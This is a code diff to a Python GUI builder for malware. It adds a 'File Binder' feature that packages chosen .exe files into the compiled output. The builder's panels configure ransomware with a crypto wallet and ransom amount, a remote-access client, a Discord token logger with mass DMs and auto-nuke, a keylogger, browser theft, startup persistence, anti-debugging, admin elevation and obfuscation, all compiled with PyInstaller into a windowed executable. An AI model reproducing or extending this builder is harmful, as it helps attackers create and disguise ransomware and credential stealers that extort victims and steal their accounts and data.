@@ -2,19 +2,66 @@
 from tqdm import tqdm
 from tkinter import *
 from PIL import Image
-import customtkinter, tkinter
 from tkinter import filedialog as fd
 from colorama import Style, Fore, Back
 from websocket import create_connection
-import customtkinter, subprocess, websocket, threading, requests, tkinter, random, base64, json, fade, time, math, sys, ssl, os
+import customtkinter, subprocess, websocket, threading, requests, tkinter, shutil, random, base64, json, fade, time, math, sys, ssl, os
 
 customtkinter.set_appearance_mode("dark")
 
-class Frame(customtkinter.CTkFrame):
-    def __init__(self, master, widgets, intonly=[], default=[], row=0, column=0, rowspan=0, columnspan=0, padx=20, pady=20, activation_widget=0):
+class ScrollableFrame(customtkinter.CTkScrollableFrame):
+    def __init__(self, master, widgets, row=0, column=0, rowspan=0, columnspan=0, padx=20, pady=20, scrollable=False):
         super().__init__(master)
 
-        self.grid(row=row, column=column, columnspan=columnspan, rowspan=rowspan, padx=20, pady=20, sticky="nsew")
+        self.grid(row=row, column=column, columnspan=columnspan, rowspan=rowspan, padx=padx, pady=padx, sticky="nsew")
+
+        for i in range(7): # Set 7 rows
+            self.rowconfigure(i, weight= 1)
+        
+        for i in range(7): # Set 6 columns
+            self.columnconfigure(i, weight= 1)
+
+        self.row = 2
+        self.filenames = []
+
+        for count, (title, data) in enumerate(widgets.items()):
+            widget = customtkinter.CTkButton(master=self, text=title, command=lambda: self.file_prompt())
+            widget.grid(row=0, column=3, sticky="nsew")
+
+            widgets[title] = self
+
+    def remove(self, target, filename):
+        self.filenames.remove(filename)
+        for count, widget in enumerate(self.winfo_children()):
+            if widget is target:
+                widget.destroy()
+
+    def file_prompt(self):
+        filetypes = (
+            ('EXE files', '*.exe'),
+        )
+
+        filename = fd.askopenfilename(
+            title='Open a file',
+            initialdir='/',
+            filetypes=filetypes)
+
+        if filename:
+            widget = customtkinter.CTkCheckBox(master=self, text=filename)
+            widget.configure(command=lambda: self.remove(widget, filename))
+            widget.configure(variable=tkinter.IntVar(value=1))
+            widget.grid(row=self.row, column=3, sticky="nsew")
+
+            self.filenames.append(filename)
+            self.row += 1
+
+        
+
+class Frame(customtkinter.CTkFrame):
+    def __init__(self, master, widgets, intonly=[], default=[], row=0, column=0, rowspan=0, columnspan=0, padx=20, pady=20, activation_widget=0, scrollable=False):
+        super().__init__(master)
+
+        self.grid(row=row, column=column, columnspan=columnspan, rowspan=rowspan, padx=padx, pady=padx, sticky="nsew")
 
         for i in range(7): # Set 7 rows
             self.rowconfigure(i, weight= 1)
@@ -150,15 +197,23 @@ class App(customtkinter.CTk):
             label.configure(text='Invalid Key')
 
     def menu(self):
-        main_frame = customtkinter.CTkFrame(self)
-        main_frame.grid(row=1, column=0, padx=20, pady=20, sticky="nsew", columnspan=18, rowspan=21)
+        tabview = customtkinter.CTkTabview(self)
+        tabview.add('Configuration')
+        tabview.add('File Binder')
+
+        tabview.grid(row=1, column=0, padx=20, pady=20, sticky="nsew", columnspan=18, rowspan=21)
+
+        main_frame = tabview.tab('Configuration')
+        binder_frame = tabview.tab('File Binder')
 
         for i in range(15): # Set 15 rows
-            main_frame.rowconfigure(i, weight= 1)
+            main_frame.rowconfigure(i, weight=1)
         
         for i in range(15): # Set 15 columns
-            main_frame.columnconfigure(i, weight= 1)
-    
+            main_frame.columnconfigure(i, weight=1)
+
+        binder_frame.rowconfigure(0, weight=1)
+        binder_frame.columnconfigure(0, weight=1)
 
         ransomware_widgets = {
             "Ransomware": [customtkinter.CTkCheckBox],
@@ -169,7 +224,7 @@ class App(customtkinter.CTk):
             "Crypto Currency": [customtkinter.CTkEntry]
         }
         
-        ransom_frame = Frame(master=main_frame, widgets=ransomware_widgets, row=0, column=11, columnspan=3, rowspan=10, pady=0, padx=0, intonly=[1, 2, 4])
+        ransom_frame = Frame(master=main_frame, widgets=ransomware_widgets, row=0, column=11, columnspan=3, rowspan=10, pady=0, padx=20, intonly=[1, 2, 4])
 
         discord_widgets = {
             "Token Logger": [customtkinter.CTkCheckBox],
@@ -178,7 +233,7 @@ class App(customtkinter.CTk):
             "MassDM Script": [customtkinter.CTkEntry]
         }
         
-        discord_frame = Frame(master=main_frame, widgets=discord_widgets, row=0, column=8, columnspan=3, rowspan=10, pady=0, padx=0)
+        discord_frame = Frame(master=main_frame, widgets=discord_widgets, row=0, column=8, columnspan=3, rowspan=10, pady=0, padx=20)
 
         connection_widgets = {
             "Connect To Server": [customtkinter.CTkCheckBox],
@@ -189,7 +244,7 @@ class App(customtkinter.CTk):
             
         }
         
-        connection_frame = Frame(master=main_frame, default=[4], widgets=connection_widgets, row=0, column=5, columnspan=3, rowspan=10, pady=0, padx=0)
+        connection_frame = Frame(master=main_frame, default=[4], widgets=connection_widgets, row=0, column=5, columnspan=3, rowspan=10, pady=0, padx=20)
 
         misc_widgets = {
             "Key Logger": [customtkinter.CTkCheckBox],
@@ -198,22 +253,28 @@ class App(customtkinter.CTk):
             "File Icon": [customtkinter.CTkButton],
             "Anti Debug": [customtkinter.CTkCheckBox],
             "Run As Admin": [customtkinter.CTkCheckBox],
-            "Base Obfuscation": [customtkinter.CTkEntry],
-            "Obfuscation Level": [customtkinter.CTkEntry]
+            "Base (2 - 55000)": [customtkinter.CTkEntry],
+            "Obfuscation (1 - 5)": [customtkinter.CTkEntry]
         }
         
-        misc_frame = Frame(master=main_frame, widgets=misc_widgets, intonly=[6, 7], default=[6, 7], row=0, column=1, columnspan=3, rowspan=15, pady=0, padx=0, activation_widget=None)
+        misc_frame = Frame(master=main_frame, widgets=misc_widgets, intonly=[6, 7], default=[6, 7], row=0, column=1, columnspan=3, rowspan=16, pady=0, padx=20, activation_widget=None)
+
+        binder_widgets = {
+            "Add File": [customtkinter.CTkButton]
+        }
+
+        binder_frame = ScrollableFrame(master=binder_frame, widgets=binder_widgets, row=0, column=0, columnspan=1, rowspan=1, pady=0, padx=0)
 
         
 
         # Compile Buttom
-        button = customtkinter.CTkButton(master=main_frame, text="Compile", command=lambda: threading.Thread(target=self.start_compile, args=(ransomware_widgets, discord_widgets, connection_widgets, misc_widgets)).start())
+        button = customtkinter.CTkButton(master=main_frame, text="Compile", command=lambda: threading.Thread(target=self.start_compile, args=(ransomware_widgets, discord_widgets, connection_widgets, misc_widgets, binder_widgets)).start())
         button.grid(row=14, column=7, columnspan=2, sticky="ew")
 
         self.response_label = customtkinter.CTkLabel(master=main_frame, text="", justify='center')
         self.response_label.grid(row=15, column=7, columnspan=2, sticky="ew")
 
-    def start_compile(self, ransomware_config, discord_config, connection_config, misc_config):
+    def start_compile(self, ransomware_config, discord_config, connection_config, misc_config, binder_widgets):
         
         server_addr = ''
         server_key = ''
@@ -259,12 +320,14 @@ class App(customtkinter.CTk):
         debug = misc_config['Anti Debug'].get()
         admin = misc_config['Run As Admin'].get()
 
-        self.base = int(misc_config['Base Obfuscation'].get())
-        self.recursion = int(misc_config['Obfuscation Level'].get())
+        binder_files = binder_widgets['Add File'].filenames
+
+        self.base = int(misc_config['Base (2 - 55000)'].get())
+        self.recursion = int(misc_config['Obfuscation (1 - 5)'].get())
 
         self.response_label.configure(text='Compiling To Exe...')
 
-        self.compile([rat_client, server_addr, server_key, dynamic_webhook, webhook, ransomware, reboots_allowed, hours, wallet, cost, crypto_type, keylogger, token_logger, massdm, massdm_script, auto_nuke, browser, startup, debug, icon, admin])
+        self.compile([rat_client, server_addr, server_key, dynamic_webhook, webhook, ransomware, reboots_allowed, hours, wallet, cost, crypto_type, keylogger, token_logger, massdm, massdm_script, auto_nuke, browser, startup, debug, icon, admin, binder_files])
 
     def banner(self):
         print(fade.greenblue("""
@@ -279,7 +342,7 @@ class App(customtkinter.CTk):
         """))
 
     def compile(self, config):
-        rat_client, server_addr, server_key, dynamic_webhook, webhook, ransomware, reboots_allowed, hours, wallet, cost, crypto_type, keylogger, token_logger, massdm, massdm_script, auto_nuke, browser, startup, debug, icon, admin = config
+        rat_client, server_addr, server_key, dynamic_webhook, webhook, ransomware, reboots_allowed, hours, wallet, cost, crypto_type, keylogger, token_logger, massdm, massdm_script, auto_nuke, browser, startup, debug, icon, admin, binder_files = config
         key = {
             "SERVER_CLIENT": rat_client,
             "HOSTNAME": f'O0O000OOO00O0OOO0("{server_addr}").decode()',
@@ -326,9 +389,15 @@ class App(customtkinter.CTk):
 
         with open('src\\temp\\instructions.txt', 'w+') as file:
             file.write(data.replace('WALLET', wallet).replace('AMOUNT', str(cost)))
+        
+        binder_args = []
 
+        for path in binder_files:
+            filename = path.split("/")[-1]
+            shutil.copyfile(path, f'src\\files\\binder_{filename}')
+            binder_args += ['--add-data', f'{dir}\\src\\files\\binder_{filename};.']
 
-        command = ['python', '-m', 'PyInstaller', '--noconfirm', '--onefile', '--windowed', '--icon' if icon else '', icon if icon else '', '--uac-admin' if admin else '', '--upx-dir', 'build\\upx', '--workpath', 'build', '--specpath', 'build\\spec', '--add-data', f'{dir}\\src\\temp\\instructions.txt;.', '--add-data', f'{dir}\\src\\files\\wallpaper.jpg;.', '--add-data', f'{dir}\\src\\files\\failed.jpg;.', '--clean', f'{dir}\\src\\output.py']
+        command = ['python', '-m', 'PyInstaller', '--noconfirm', '--onefile', '--windowed', '--icon' if icon else '', icon if icon else '', '--uac-admin' if admin else '', '--upx-dir', 'build\\upx', '--workpath', 'build', '--specpath', 'build\\spec', '--add-data', f'{dir}\\src\\temp\\instructions.txt;.', '--add-data', f'{dir}\\src\\files\\wallpaper.jpg;.', '--add-data', f'{dir}\\src\\files\\failed.jpg;.'] + binder_args + ['--clean', f'{dir}\\src\\output.py']
         for _ in range(command.count('')):
             command.remove('')
         print(command)
